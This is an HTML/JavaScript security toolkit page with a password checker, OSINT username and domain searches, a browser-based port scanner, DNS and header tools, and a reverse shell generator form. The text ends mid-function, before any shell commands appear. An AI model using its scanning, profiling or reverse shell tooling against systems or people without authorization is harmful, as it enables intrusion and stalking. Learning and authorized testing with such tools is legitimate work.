<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersecurity Toolkit</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        h1, h2, h3 {
            color: #333;
        }
        input, button, select, textarea {
            padding: 10px;
            margin: 5px 0;
        }
        textarea {
            width: 100%;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result {
            margin-top: 10px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            white-space: pre-line;
            max-height: 300px;
            overflow-y: auto;
        }
        .section {
            margin-top: 15px;
            padding: 15px;
            background-color: #f9f9f9;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .section-title {
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 1.2em;
        }
        .loading {
            text-align: center;
            padding: 20px;
            font-style: italic;
            color: #666;
        }
        a {
            color: #2a5db0;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .result-item {
            margin-bottom: 8px;
        }
        .nav-menu {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        .nav-item {
            background-color: #f1f1f1;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
        }
        .nav-item:hover {
            background-color: #e1e1e1;
        }
        .nav-item.active {
            background-color: #4CAF50;
            color: white;
        }
        .tool-section {
            display: none;
        }
        .tool-section.active {
            display: block;
        }
        .network-info {
            margin-bottom: 15px;
        }
        .code-box {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            font-family: monospace;
            white-space: pre-wrap;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>Milan's Cybersecurity Toolkit</h1>
    
    <!-- Navigation Menu -->
    <div class="nav-menu">
        <div class="nav-item active" data-tool="password">Password Strength</div>
        <div class="nav-item" data-tool="osint">OSINT Toolkit</div>
        <div class="nav-item" data-tool="port">Port Scanner</div>
        <div class="nav-item" data-tool="http">HTTP Header Analysis</div>
        <div class="nav-item" data-tool="email">Email Validator</div>
        <div class="nav-item" data-tool="dns">DNS Resolver</div>
        <div class="nav-item" data-tool="hash">Hash Generator</div>
        <div class="nav-item" data-tool="geolocation">IP Geolocation</div>
        <div class="nav-item" data-tool="whois">WHOIS Lookup</div>
        <div class="nav-item" data-tool="network">Network Info</div>
        <div class="nav-item" data-tool="shell">Reverse Shell</div>
    </div>

    <!-- Password Strength Tool -->
    <div class="tool-section active" id="password-tool">
        <div class="section">
            <div class="section-title">Password Strength Checker</div>
            <form id="passwordForm">
                <input type="password" id="passwordInput" placeholder="Enter Password" required>
                <button type="submit">Check Password Strength</button>
            </form>
            <div id="passwordResult" class="result"></div>
        </div>
    </div>

    <!-- OSINT Tool -->
    <div class="tool-section" id="osint-tool">
        <div class="section">
            <div class="section-title">OSINT Toolkit Integration</div>
            <form id="osintForm">
                <input type="text" id="osintInput" placeholder="Enter Domain, Username, or Email" required>
                <button type="submit">Perform OSINT Search</button>
            </form>
            <div id="osintResult" class="result"></div>
        </div>
    </div>

    <!-- Port Scanner Tool -->
    <div class="tool-section" id="port-tool">
        <div class="section">
            <div class="section-title">Port Scanner</div>
            <p>Note: Due to browser security restrictions, this scanner can only check a limited set of common ports.</p>
            <form id="portScannerForm">
                <input type="text" id="hostInput" placeholder="Enter hostname or IP" required>
                <div>
                    <label for="portRangeStart">Start Port:</label>
                    <input type="number" id="portRangeStart" value="80" min="1" max="1000" style="width: 70px;">
                    <label for="portRangeEnd">End Port:</label>
                    <input type="number" id="portRangeEnd" value="90" min="1" max="1000" style="width: 70px;">
                </div>
                <button type="submit">Scan Ports</button>
            </form>
            <div id="portScannerResult" class="result"></div>
        </div>
    </div>

    <!-- HTTP Header Analysis Tool -->
    <div class="tool-section" id="http-tool">
        <div class="section">
            <div class="section-title">HTTP Header Analysis</div>
            <form id="httpHeaderForm">
                <input type="url" id="urlInput" placeholder="Enter URL (include http:// or https://)" required>
                <button type="submit">Analyze Headers</button>
            </form>
            <div id="httpHeaderResult" class="result"></div>
        </div>
    </div>

    <!-- Email Validator Tool -->
    <div class="tool-section" id="email-tool">
        <div class="section">
            <div class="section-title">Email Address Validator</div>
            <form id="emailValidatorForm">
                <input type="text" id="emailInput" placeholder="Enter email address" required>
                <button type="submit">Validate Email</button>
            </form>
            <div id="emailValidatorResult" class="result"></div>
        </div>
    </div>

    <!-- DNS Resolver Tool -->
    <div class="tool-section" id="dns-tool">
        <div class="section">
            <div class="section-title">DNS Resolver</div>
            <form id="dnsResolverForm">
                <input type="text" id="domainInput" placeholder="Enter domain name" required>
                <select id="recordType">
                    <option value="A">A (IPv4 Address)</option>
                    <option value="AAAA">AAAA (IPv6 Address)</option>
                    <option value="MX">MX (Mail Exchange)</option>
                    <option value="TXT">TXT (Text)</option>
                    <option value="NS">NS (Name Server)</option>
                    <option value="SOA">SOA (Start of Authority)</option>
                </select>
                <button type="submit">Resolve DNS</button>
            </form>
            <div id="dnsResolverResult" class="result"></div>
        </div>
    </div>

    <!-- Hash Generator Tool -->
    <div class="tool-section" id="hash-tool">
        <div class="section">
            <div class="section-title">Hash Generator</div>
            <form id="hashGeneratorForm">
                <textarea id="textToHash" placeholder="Enter text to hash" rows="4"></textarea>
                <select id="hashAlgorithm">
                    <option value="md5">MD5</option>
                    <option value="sha1">SHA-1</option>
                    <option value="sha256">SHA-256</option>
                    <option value="sha512">SHA-512</option>
                </select>
                <button type="submit">Generate Hash</button>
            </form>
            <div id="hashGeneratorResult" class="result"></div>
        </div>
    </div>

    <!-- IP Geolocation Tool -->
    <div class="tool-section" id="geolocation-tool">
        <div class="section">
            <div class="section-title">IP Geolocation</div>
            <form id="geolocateForm">
                <input type="text" id="ipAddressInput" placeholder="Enter IP address (leave blank for your own IP)" required>
                <button type="submit">Geolocate IP</button>
            </form>
            <div id="geolocateResult" class="result"></div>
        </div>
    </div>

    <!-- WHOIS Lookup Tool -->
    <div class="tool-section" id="whois-tool">
        <div class="section">
            <div class="section-title">WHOIS Lookup</div>
            <p>Access domain registration information through public WHOIS services.</p>
            <form id="whoisForm">
                <input type="text" id="whoisDomainInput" placeholder="Enter domain (e.g., example.com)" required>
                <button type="submit">Lookup WHOIS Information</button>
            </form>
            <div id="whoisResult" class="result"></div>
        </div>
    </div>

    <!-- Network Information Tool -->
    <div class="tool-section" id="network-tool">
        <div class="section">
            <div class="section-title">Network Information</div>
            <p>This tool provides information about your current network.</p>
            <button id="getNetworkInfo">Get Network Information</button>
            <div id="networkInfoResult" class="result"></div>
        </div>
    </div>

    <!-- Reverse Shell Generator Tool -->
    <div class="tool-section" id="shell-tool">
        <div class="section">
            <div class="section-title">Reverse Shell Generator</div>
            <p>Generate reverse shell commands for various platforms. <strong>For educational purposes only.</strong></p>
            <form id="reverseShellForm">
                <div>
                    <label for="shellIp">Listener IP:</label>
                    <input type="text" id="shellIp" placeholder="e.g., 192.168.1.10" required>
                </div>
                <div>
                    <label for="shellPort">Listener Port:</label>
                    <input type="number" id="shellPort" placeholder="e.g., 4444" value="4444" min="1" max="65535" required>
                </div>
                <div>
                    <label for="shellType">Shell Type:</label>
                    <select id="shellType">
                        <option value="bash">Bash</option>
                        <option value="python">Python</option>
                        <option value="perl">Perl</option>
                        <option value="php">PHP</option>
                        <option value="ruby">Ruby</option>
                        <option value="netcat">Netcat</option>
                        <option value="powershell">PowerShell</option>
                    </select>
                </div>
                <button type="submit">Generate Shell Command</button>
            </form>
            <div id="reverseShellResult" class="result"></div>
        </div>
    </div>

    <script>
        // Navigation Menu Functionality
        $(document).ready(function() {
            $('.nav-item').on('click', function() {
                $('.nav-item').removeClass('active');
                $(this).addClass('active');
                
                const toolId = $(this).data('tool');
                $('.tool-section').removeClass('active');
                $(`#${toolId}-tool`).addClass('active');
            });
        });

        // 1. Password Strength Checker
        function passwordStrengthChecker(password) {
            let strength = "Very Weak";
            let suggestions = [];

            if (password.length < 6) {
                strength = "Very Weak";
                suggestions.push("Increase the length of your password to at least 8 characters.");
            } else if (password.length < 8) {
                strength = "Weak";
                suggestions.push("Consider using at least 8 characters for better security.");
            }

            if (!/[A-Z]/.test(password)) {
                suggestions.push("Include at least one uppercase letter.");
            }
            if (!/[0-9]/.test(password)) {
                suggestions.push("Include at least one number.");
            }
            if (!/[@$!%*?&]/.test(password)) {
                suggestions.push("Include at least one special character (@, $, !, %, *, ?, &).");
            }

            if (password.length >= 8 && /[A-Z]/.test(password) && /[0-9]/.test(password) && /[@$!%*?&]/.test(password)) {
                strength = "Strong";
            } else if (password.length >= 8) {
                strength = "Medium";
            }

            let result = `Password Strength: ${strength}\n`;
            if (suggestions.length > 0) {
                result += "Suggestions to improve your password:\n";
                for (const suggestion of suggestions) {
                    result += `- ${suggestion}\n`;
                }
            }
            return result;
        }

        // 2. OSINT Toolkit Implementation
        async function performRealOsintSearch(query) {
            $('#osintResult').html('<div class="loading">Loading OSINT data... Please wait.</div>');
            
            let resultHTML = '';
            const queryType = determineQueryType(query);
            
            try {
                // Handle different query types
                if (queryType === 'email') {
                    resultHTML += await getEmailInfo(query);
                } else if (queryType === 'domain') {
                    resultHTML += await getDomainInfo(query);
                } else if (queryType === 'username') {
                    resultHTML += await getUsernameInfo(query);
                } else {
                    resultHTML += `<div class="section">
                        <div class="section-title">Query Analysis</div>
                        <p>Your input doesn't match standard patterns for email, domain, or username.</p>
                    </div>`;
                }
                
                // Add direct search links
                resultHTML += getDirectSearchLinks(query);
                
            } catch (error) {
                resultHTML += `<div class="section">
                    <div class="section-title">Error</div>
                    <p>An error occurred while fetching data: ${error.message}</p>
                </div>`;
            }
            
            return resultHTML;
        }
        
        function determineQueryType(query) {
            if (query.includes('@')) {
                return 'email';
            } else if (/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/.test(query)) {
                return 'domain';
            } else {
                return 'username';
            }
        }
        
        async function getEmailInfo(email) {
            // Basic email analysis
            const emailParts = email.split('@');
            const username = emailParts[0];
            const domain = emailParts[1];
            
            let resultHTML = `<div class="section">
                <div class="section-title">Email Analysis</div>
                <p class="result-item"><strong>Email:</strong> ${email}</p>
                <p class="result-item"><strong>Username part:</strong> ${username}</p>
                <p class="result-item"><strong>Domain part:</strong> ${domain}</p>
                <p class="result-item"><strong>Email format:</strong> ${detectEmailFormat(username)}</p>
            </div>`;
            
            // Domain information for the email domain
            try {
                const domainInfo = await fetchDomainInfo(domain);
                resultHTML += `<div class="section">
                    <div class="section-title">Email Domain Information</div>
                    ${domainInfo}
                </div>`;
            } catch (error) {
                resultHTML += `<div class="section">
                    <div class="section-title">Email Domain Information</div>
                    <p>Unable to fetch information for domain: ${domain}</p>
                </div>`;
            }
            
            return resultHTML;
        }
        
        function detectEmailFormat(username) {
            if (/^[a-z]+\.[a-z]+$/.test(username)) {
                return "first.last format (common in corporate environments)";
            } else if (/^[a-z]+[0-9]+$/.test(username)) {
                return "name with numbers (possibly personal or contains birth year)";
            } else if (username.includes('.') || username.includes('_')) {
                return "separated format (uses dots or underscores as separators)";
            } else {
                return "standard format";
            }
        }
        
        async function getDomainInfo(domain) {
            let resultHTML = `<div class="section">
                <div class="section-title">Domain Information</div>
                <p class="result-item"><strong>Domain:</strong> ${domain}</p>`;
            
            // Add domain DNS information
            const dnsInfo = await fetchDomainInfo(domain);
            resultHTML += dnsInfo;
            
            // Add HTTP/HTTPS links
            resultHTML += `<div class="result-item">
                <strong>Visit Website:</strong>
                <ul>
                    <li><a href="http://${domain}" target="_blank">http://${domain}</a></li>
                    <li><a href="https://${domain}" target="_blank">https://${domain}</a></li>
                </ul>
            </div>`;
            
            // Add WHOIS lookup link
            resultHTML += `<div class="result-item">
                <strong>WHOIS Lookup:</strong>
                <ul>
                    <li><a href="https://lookup.icann.org/en/lookup?q=${domain}" target="_blank">ICANN WHOIS</a></li>
                    <li><a href="https://who.is/whois/${domain}" target="_blank">who.is</a></li>
                </ul>
            </div>`;
            
            resultHTML += `</div>`;
            
            return resultHTML;
        }
        
        async function fetchDomainInfo(domain) {
            let infoHTML = '';
            
            try {
                // DNS lookup using Google's public DNS API
                const dnsResponse = await fetch(`https://dns.google/resolve?name=${domain}`);
                const dnsData = await dnsResponse.json();
                
                if (dnsData.Answer) {
                    // A records (IPv4)
                    const aRecords = dnsData.Answer.filter(record => record.type === 1).map(record => record.data);
                    if (aRecords.length > 0) {
                        infoHTML += `<p class="result-item"><strong>IP Addresses:</strong></p><ul>`;
                        aRecords.forEach(ip => {
                            infoHTML += `<li>${ip}</li>`;
                        });
                        infoHTML += `</ul>`;
                    }
                    
                    // MX Records
                    const mxRecords = dnsData.Answer.filter(record => record.type === 15).map(record => record.data);
                    if (mxRecords.length > 0) {
                        infoHTML += `<p class="result-item"><strong>Mail Servers:</strong></p><ul>`;
                        mxRecords.forEach(mx => {
                            infoHTML += `<li>${mx}</li>`;
                        });
                        infoHTML += `</ul>`;
                    }
                    
                    // NS Records
                    const nsRecords = dnsData.Answer.filter(record => record.type === 2).map(record => record.data);
                    if (nsRecords.length > 0) {
                        infoHTML += `<p class="result-item"><strong>Name Servers:</strong></p><ul>`;
                        nsRecords.forEach(ns => {
                            infoHTML += `<li>${ns}</li>`;
                        });
                        infoHTML += `</ul>`;
                    }
                    
                    // TXT Records
                    const txtRecords = dnsData.Answer.filter(record => record.type === 16).map(record => record.data);
                    if (txtRecords.length > 0) {
                        infoHTML += `<p class="result-item"><strong>TXT Records:</strong></p><ul>`;
                        txtRecords.forEach(txt => {
                            infoHTML += `<li>${txt}</li>`;
                        });
                        infoHTML += `</ul>`;
                    }
                } else {
                    infoHTML += `<p>No DNS records found or domain might not exist.</p>`;
                }
            } catch (error) {
                infoHTML += `<p>Error fetching DNS information: ${error.message}</p>`;
            }
            
            return infoHTML;
        }
        
        async function getUsernameInfo(username) {
            const encodedUsername = encodeURIComponent(username);
            
            let resultHTML = `<div class="section">
                <div class="section-title">Username Search</div>
                <p class="result-item"><strong>Username:</strong> ${username}</p>
                
                <div class="result-item">
                <strong>Search for username across platforms:</strong>
                <ul>
                    <li><a href="https://github.com/search?q=${encodedUsername}&type=users" target="_blank">GitHub: Search for "${username}"</a></li>
                    <li><a href="https://twitter.com/search?q=${encodedUsername}&f=user" target="_blank">Twitter: Search for "${username}"</a></li>
                    <li><a href="https://www.instagram.com/explore/search/keyword/?q=${encodedUsername}" target="_blank">Instagram: Search for "${username}"</a></li>
                    <li><a href="https://www.reddit.com/search/?q=${encodedUsername}&type=user" target="_blank">Reddit: Search for "${username}"</a></li>
                    <li><a href="https://www.linkedin.com/search/results/people/?keywords=${encodedUsername}" target="_blank">LinkedIn: Search for "${username}"</a></li>
                    <li><a href="https://medium.com/search?q=${encodedUsername}" target="_blank">Medium: Search for "${username}"</a></li>
                    <li><a href="https://www.youtube.com/results?search_query=${encodedUsername}" target="_blank">YouTube: Search for "${username}"</a></li>
                    <li><a href="https://www.facebook.com/search/people/?q=${encodedUsername}" target="_blank">Facebook: Search for "${username}"</a></li>
                    <li><a href="https://tiktok.com/search?q=${encodedUsername}" target="_blank">TikTok: Search for "${username}"</a></li>
                </ul>
                </div>
            </div>`;
            
            return resultHTML;
        }
        
        function getDirectSearchLinks(query) {
            const encodedQuery = encodeURIComponent(query);
            
            let resultHTML = `<div class="section">
                <div class="section-title">Search Engine Links</div>
                <p>Search for <strong>${query}</strong> across these platforms:</p>
                <ul>
                    <li><a href="https://www.google.com/search?q=${encodedQuery}" target="_blank">Google Search</a></li>
                    <li><a href="https://duckduckgo.com/?q=${encodedQuery}" target="_blank">DuckDuckGo</a></li>
                    <li><a href="https://www.bing.com/search?q=${encodedQuery}" target="_blank">Bing</a></li>
                    <li><a href="https://www.shodan.io/search?query=${encodedQuery}" target="_blank">Shodan (for technical information)</a></li>
                    <li><a href="https://www.virustotal.com/gui/search/${encodedQuery}" target="_blank">VirusTotal</a></li>
                    <li><a href="https://github.com/search?q=${encodedQuery}" target="_blank">GitHub Search</a></li>
                    <li><a href="https://www.linkedin.com/search/results/all/?keywords=${encodedQuery}" target="_blank">LinkedIn Search</a></li>
                </ul>
            </div>`;
            
            return resultHTML;
        }

        // Improved Port Scanner implementation
        async function portScanner(host, startPort, endPort) {
            if (!host) {
                return "Please enter a valid hostname or IP address.";
            }
            
            // Validate port range
            if (startPort < 1 || startPort > 65535 || endPort < 1 || endPort > 65535) {
                return "Ports must be between 1 and 65535.";
            }
            
            if (endPort < startPort) {
                return "End port must be greater than or equal to start port.";
            }
            
            // Limit the range to prevent browser hanging or excessive requests
            if (endPort - startPort > 100) {
                return "Please limit port scanning to 100 ports at a time for performance reasons.";
            }
            
            // Ensure host has a protocol (required for fetch)
            if (!host.startsWith('http://') && !host.startsWith('https://')) {
                host = 'http://' + host;
            }
            
            let result = `Scanning ${host} for open ports from ${startPort} to ${endPort}...\n\n`;
            let openPorts = [];
            let timeoutPorts = [];
            let errorPorts = [];
            
            // Create an array of promises for port scanning
            const scanPromises = [];
            
            for (let port = startPort; port <= endPort; port++) {
                scanPromises.push(checkPort(host, port));
            }
            
            // Wait for all scans to complete
            const results = await Promise.all(scanPromises);
            
            // Process results
            results.forEach(res => {
                if (res.status === 'open') {
                    openPorts.push(res.port);
                } else if (res.status === 'timeout') {
                    timeoutPorts.push(res.port);
                } else if (res.status === 'error') {
                    errorPorts.push(res.port);
                }
            });
            
            // Add results to output
            if (openPorts.length > 0) {
                result += "Open ports:\n";
                openPorts.forEach(port => {
                    result += `- Port ${port}: OPEN\n`;
                });
            } else {
                result += "No open ports found in the specified range.\n";
            }
            
            if (timeoutPorts.length > 0) {
                result += "\nPorts that timed out (may be filtered or closed):\n";
                result += `- ${timeoutPorts.join(', ')}\n`;
            }
            
            if (errorPorts.length > 0) {
                result += "\nPorts with connection errors:\n";
                result += `- ${errorPorts.join(', ')}\n`;
            }
            
            result += "\nNote: Browser-based port scanning has limitations. For a more comprehensive scan, consider using a dedicated port scanning tool.\n";
            
            return result;
        }
        
        async function checkPort(host, port) {
            const url = `${host}:${port}`;
            
            try {
                const controller = new AbortController();
                const signal = controller.signal;
                
                // Set a timeout for the fetch request
                const timeoutId = setTimeout(() => controller.abort(), 2000);
                
                const response = await fetch(url, {
                    mode: 'no-cors',  // This allows the request but limits response info
                    cache: 'no-store',
                    signal: signal
                });
                
                clearTimeout(timeoutId);
                
                // If we get here, we got a response (port is likely open)
                return { port: port, status: 'open' };
            } catch (error) {
                if (error.name === 'AbortError') {
                    // Request timed out - port might be filtered or closed
                    return { port: port, status: 'timeout' };
                } else {
                    // Other errors - could be CORS, or port is closed
                    // Note: Most closed ports will show up as errors due to browser security
                    return { port: port, status: 'error', message: error.message };
                }
            }
        }

        // 4. HTTP Header Analysis
        async function analyzeHttpHeaders(url) {
            try {
                // Use a CORS proxy or direct fetch if possible
                const response = await fetch(`https://cors-anywhere.herokuapp.com/${url}`, {
                    method: 'GET'
                });
                
                let result = `HTTP Headers for ${url}:\n\n`;
                
                // Get all headers
                for (const [key, value] of response.headers.entries()) {
                    result += `${key}: ${value}\n`;
                }
                
                // Add security analysis
                result += `\nSecurity Analysis:\n`;
                
                // Check for security headers
                const securityHeaders = {
                    'Strict-Transport-Security': 'Missing HSTS header. This helps prevent downgrade attacks.',
                    'Content-Security-Policy': 'Missing CSP header. This helps prevent XSS attacks.',
                    'X-Content-Type-Options': 'Missing X-Content-Type-Options header. This prevents MIME type sniffing.',
                    'X-Frame-Options': 'Missing X-Frame-Options header. This prevents clickjacking attacks.',
                    'X-XSS-Protection': 'Missing X-XSS-Protection header. This helps prevent XSS attacks in older browsers.'
                };
                
                for (const [header, message] of Object.entries(securityHeaders)) {
                    if (!response.headers.has(header.toLowerCase())) {
                        result += `- ${message}\n`;
                    } else {
                        result += `- ${header} is properly set: ${response.headers.get(header.toLowerCase())}\n`;
                    }
                }
                
                return result;
            } catch (error) {
                return `Error analyzing HTTP headers: ${error.message}\n\nNote: This may be due to CORS restrictions. Try using a different URL or consider using a server-side tool for this analysis.`;
            }
        }

        // 5. Email Validator
        async function validateEmail(email) {
            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            
            if (!emailRegex.test(email)) {
                return `${email} is not a valid email format.\n\nEmail addresses should follow the pattern: username@domain.tld`;
            }
            
            const domain = email.split('@')[1];
            let result = `Basic validation: ${email} has a valid format.\n\n`;
            
            try {
                // Check if domain has MX records
                const dnsResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
                const dnsData = await dnsResponse.json();
                
                if (dnsData.Answer && dnsData.Answer.length > 0) {
                    result += `Email domain validation: Domain ${domain} has valid MX records.\n\n`;
                    result += `Mail servers:\n`;
                    
                    dnsData.Answer.forEach(record => {
                        result += `- ${record.data}\n`;
                    });
                    
                    result += `\nThis suggests the domain is configured to receive email.`;
                } else {
                    result += `Email domain validation: Domain ${domain} does not have MX records.\nThis suggests the domain cannot receive email.`;
                }
            } catch (error) {
                result += `Error checking MX records: ${error.message}`;
            }
            
            return result;
        }

        // 6. DNS Resolver
        async function resolveDns(domain, recordType) {
            try {
                const dnsResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=${recordType}`);
                const dnsData = await dnsResponse.json();
                
                let result = `DNS Resolution for ${domain} (${recordType} records):\n\n`;
                
                if (dnsData.Answer && dnsData.Answer.length > 0) {
                    dnsData.Answer.forEach(record => {
                        result += `- ${record.data}\n`;
                    });
                } else {
                    result += `No ${recordType} records found for ${domain}.`;
                }
                
                return result;
            } catch (error) {
                return `Error resolving DNS: ${error.message}`;
            }
        }

        // MD5 implementation in JavaScript
        function md5(string) {
            function cmn(q, a, b, x, s, t) {
                a = add32(add32(a, q), add32(x, t));
                return add32((a << s) | (a >>> (32 - s)), b);
            }

            function ff(a, b, c, d, x, s, t) {
                return cmn((b & c) | ((~b) & d), a, b, x, s, t);
            }

            function gg(a, b, c, d, x, s, t) {
                return cmn((b & d) | (c & (~d)), a, b, x, s, t);
            }

            function hh(a, b, c, d, x, s, t) {
                return cmn(b ^ c ^ d, a, b, x, s, t);
            }

            function ii(a, b, c, d, x, s, t) {
                return cmn(c ^ (b | (~d)), a, b, x, s, t);
            }

            function md5cycle(x, k) {
                let a = x[0], b = x[1], c = x[2], d = x[3];

                a = ff(a, b, c, d, k[0], 7, -680876936);
                d = ff(d, a, b, c, k[1], 12, -389564586);
                c = ff(c, d, a, b, k[2], 17, 606105819);
                b = ff(b, c, d, a, k[3], 22, -1044525330);
                a = ff(a, b, c, d, k[4], 7, -176418897);
                d = ff(d, a, b, c, k[5], 12, 1200080426);
                c = ff(c, d, a, b, k[6], 17, -1473231341);
                b = ff(b, c, d, a, k[7], 22, -45705983);
                a = ff(a, b, c, d, k[8], 7, 1770035416);
                d = ff(d, a, b, c, k[9], 12, -1958414417);
                c = ff(c, d, a, b, k[10], 17, -42063);
                b = ff(b, c, d, a, k[11], 22, -1990404162);
                a = ff(a, b, c, d, k[12], 7, 1804603682);
                d = ff(d, a, b, c, k[13], 12, -40341101);
                c = ff(c, d, a, b, k[14], 17, -1502002290);
                b = ff(b, c, d, a, k[15], 22, 1236535329);

                a = gg(a, b, c, d, k[1], 5, -165796510);
                d = gg(d, a, b, c, k[6], 9, -1069501632);
                c = gg(c, d, a, b, k[11], 14, 643717713);
                b = gg(b, c, d, a, k[0], 20, -373897302);
                a = gg(a, b, c, d, k[5], 5, -701558691);
                d = gg(d, a, b, c, k[10], 9, 38016083);
                c = gg(c, d, a, b, k[15], 14, -660478335);
                b = gg(b, c, d, a, k[4], 20, -405537848);
                a = gg(a, b, c, d, k[9], 5, 568446438);
                d = gg(d, a, b, c, k[14], 9, -1019803690);
                c = gg(c, d, a, b, k[3], 14, -187363961);
                b = gg(b, c, d, a, k[8], 20, 1163531501);
                a = gg(a, b, c, d, k[13], 5, -1444681467);
                d = gg(d, a, b, c, k[2], 9, -51403784);
                c = gg(c, d, a, b, k[7], 14, 1735328473);
                b = gg(b, c, d, a, k[12], 20, -1926607734);

                a = hh(a, b, c, d, k[5], 4, -378558);
                d = hh(d, a, b, c, k[8], 11, -2022574463);
                c = hh(c, d, a, b, k[11], 16, 1839030562);
                b = hh(b, c, d, a, k[14], 23, -35309556);
                a = hh(a, b, c, d, k[1], 4, -1530992060);
                d = hh(d, a, b, c, k[4], 11, 1272893353);
                c = hh(c, d, a, b, k[7], 16, -155497632);
                b = hh(b, c, d, a, k[10], 23, -1094730640);
                a = hh(a, b, c, d, k[13], 4, 681279174);
                d = hh(d, a, b, c, k[0], 11, -358537222);
                c = hh(c, d, a, b, k[3], 16, -722521979);
                b = hh(b, c, d, a, k[6], 23, 76029189);
                a = hh(a, b, c, d, k[9], 4, -640364487);
                d = hh(d, a, b, c, k[12], 11, -421815835);
                c = hh(c, d, a, b, k[15], 16, 530742520);
                b = hh(b, c, d, a, k[2], 23, -995338651);

                a = ii(a, b, c, d, k[0], 6, -198630844);
                d = ii(d, a, b, c, k[7], 10, 1126891415);
                c = ii(c, d, a, b, k[14], 15, -1416354905);
                b = ii(b, c, d, a, k[5], 21, -57434055);
                a = ii(a, b, c, d, k[12], 6, 1700485571);
                d = ii(d, a, b, c, k[3], 10, -1894986606);
                c = ii(c, d, a, b, k[10], 15, -1051523);
                b = ii(b, c, d, a, k[1], 21, -2054922799);
                a = ii(a, b, c, d, k[8], 6, 1873313359);
                d = ii(d, a, b, c, k[15], 10, -30611744);
                c = ii(c, d, a, b, k[6], 15, -1560198380);
                b = ii(b, c, d, a, k[13], 21, 1309151649);
                a = ii(a, b, c, d, k[4], 6, -145523070);
                d = ii(d, a, b, c, k[11], 10, -1120210379);
                c = ii(c, d, a, b, k[2], 15, 718787259);
                b = ii(b, c, d, a, k[9], 21, -343485551);

                x[0] = add32(a, x[0]);
                x[1] = add32(b, x[1]);
                x[2] = add32(c, x[2]);
                x[3] = add32(d, x[3]);
            }

            function md5blk(s) {
                const md5blks = [];
                for (let i = 0; i < 64; i += 4) {
                    md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) + (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
                }
                return md5blks;
            }

            function md5blk_array(a) {
                const md5blks = [];
                for (let i = 0; i < 64; i += 4) {
                    md5blks[i >> 2] = a[i] + (a[i + 1] << 8) + (a[i + 2] << 16) + (a[i + 3] << 24);
                }
                return md5blks;
            }

            function md51(s) {
                const n = s.length;
                const state = [1732584193, -271733879, -1732584194, 271733878];
                let i;

                for (i = 64; i <= s.length; i += 64) {
                    md5cycle(state, md5blk(s.substring(i - 64, i)));
                }

                s = s.substring(i - 64);
                const tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];

                for (i = 0; i < s.length; i++) {
                    tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
                }

                tail[i >> 2] |= 0x80 << ((i % 4) << 3);
                if (i > 55) {
                    md5cycle(state, tail);
                    for (i = 0; i < 16; i++) tail[i] = 0;
                }

                tail[14] = n * 8;
                md5cycle(state, tail);
                return state;
            }

            function md51_array(a) {
                const n = a.length;
                const state = [1732584193, -271733879, -1732584194, 271733878];
                let i;

                for (i = 64; i <= a.length; i += 64) {
                    md5cycle(state, md5blk_array(a.subarray(i - 64, i)));
                }

                a = (i - 64) < a.length ? a.subarray(i - 64) : new Uint8Array(0);
                const tail = new Uint8Array(64);
                tail.set(a);
                tail[a.length] = 0x80;

                if (a.length > 55) {
                    md5cycle(state, md5blk_array(tail));
                    tail.fill(0);
                }

                tail[14] = n * 8;
                tail[15] = (n * 8) >>> 32;
                md5cycle(state, md5blk_array(tail));
                return state;
            }

            function add32(a, b) {
                return (a + b) & 0xFFFFFFFF;
            }

            function hex_md5(s) {
                const state = md51(s);
                let result = '';
                for (let i = 0; i < 4; i++) {
                    for (let j = 0; j < 8; j += 2) {
                        result += ((state[i] >>> (j * 4)) & 0xF).toString(16) + ((state[i] >>> ((j + 1) * 4)) & 0xF).toString(16);
                    }
                }
                return result;
            }

            function hex_md5_array(a) {
                const state = md51_array(a);
                let result = '';
                for (let i = 0; i < 4; i++) {
                    for (let j = 0; j < 8; j += 2) {
                        result += ((state[i] >>> (j * 4)) & 0xF).toString(16) + ((state[i] >>> ((j + 1) * 4)) & 0xF).toString(16);
                    }
                }
                return result;
            }

            if (typeof string === 'string') {
                return hex_md5(string);
            } else {
                return hex_md5_array(new Uint8Array(string));
            }
        }

        // Replace the existing generateHash function with this updated version
        async function generateHash(text, algorithm) {
            if (!text) {
                return 'Please enter text to hash.';
            }
            
            // Special case for MD5 since it's not in Web Crypto API
            if (algorithm === 'md5') {
                try {
                    const hash = md5(text);
                    return `MD5 Hash:\n${hash}`;
                } catch (error) {
                    return `Error generating MD5 hash: ${error.message}`;
                }
            }
            
            // Use SubtleCrypto API for other algorithms
            const encoder = new TextEncoder();
            const data = encoder.encode(text);
            
            let hashAlgorithm;
            switch (algorithm) {
                case 'sha1':
                    hashAlgorithm = 'SHA-1';
                    break;
                case 'sha256':
                    hashAlgorithm = 'SHA-256';
                    break;
                case 'sha512':
                    hashAlgorithm = 'SHA-512';
                    break;
                default:
                    hashAlgorithm = 'SHA-256';
            }
            
            try {
                const hashBuffer = await crypto.subtle.digest(hashAlgorithm, data);
                // Convert hash to hex string
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
